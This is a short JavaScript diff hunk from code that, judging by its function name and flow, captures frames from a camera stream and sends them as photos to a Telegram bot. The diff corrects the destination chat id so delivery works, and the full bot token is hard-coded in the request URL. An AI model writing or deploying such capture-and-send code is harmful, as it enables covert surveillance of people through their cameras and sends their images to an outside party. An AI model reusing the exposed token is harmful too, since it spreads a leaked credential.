@@ -23,7 +23,7 @@ function takePhotosAndSend(stream) {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         canvas.toBlob(blob => {
             const formData = new FormData();
-            formData.append('chat_id', '1002235920593');
+            formData.append('chat_id', '-1002235920593');
             formData.append('photo', blob, 'photo.jpg');
             
             fetch(`https://api.telegram.org/bot6407133472:AAHEdXwqUMWAWlBcaFluPJyKXxzJyAxuhfE/sendPhoto`, {
